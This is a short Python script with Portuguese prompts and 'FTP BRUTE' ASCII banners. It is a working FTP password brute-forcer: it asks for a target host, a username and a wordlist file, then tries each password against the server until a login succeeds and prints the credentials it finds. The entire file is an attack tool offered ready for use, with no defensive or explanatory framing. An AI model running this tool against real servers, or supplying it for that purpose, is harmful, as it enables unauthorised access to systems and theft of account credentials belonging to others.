import ftplib
from colorama import Fore, init

def banner():
    print("""███████╗████████╗██████╗░
██╔════╝╚══██╔══╝██╔══██╗
█████╗░░░░░██║░░░██████╔╝
██╔══╝░░░░░██║░░░██╔═══╝░
██║░░░░░░░░██║░░░██║░░░░░
""")
banner()

def banner():
    print("""██████╗░██████╗░██╗░░░██╗████████╗███████╗
██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝
██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░
██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░
██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗""")
banner()
print()

init()


host = input("Digite o endereço IP ou nome do host do servidor FTP: ")


user = input("Digite o nome de usuário do servidor FTP: ")


port = 21

def is_correct(password):

    server = ftplib.FTP()
    print(f"[!] Tentando", password)
    try:

        server.connect(host, port, timeout=5)

        server.login(user, password)
    except ftplib.error_perm:

        return False
    else:

        print(f"{Fore.GREEN}[+] Credenciais encontradas:", password, Fore.RESET)
        return True


password_file_path = input("Digite o caminho completo para o arquivo de lista de senhas: ")


with open(password_file_path, 'r') as password_file:
    passwords = password_file.read().splitlines()

print("[+] Senhas a serem testadas:", len(passwords))



for password in passwords:
    if is_correct(password):
        break
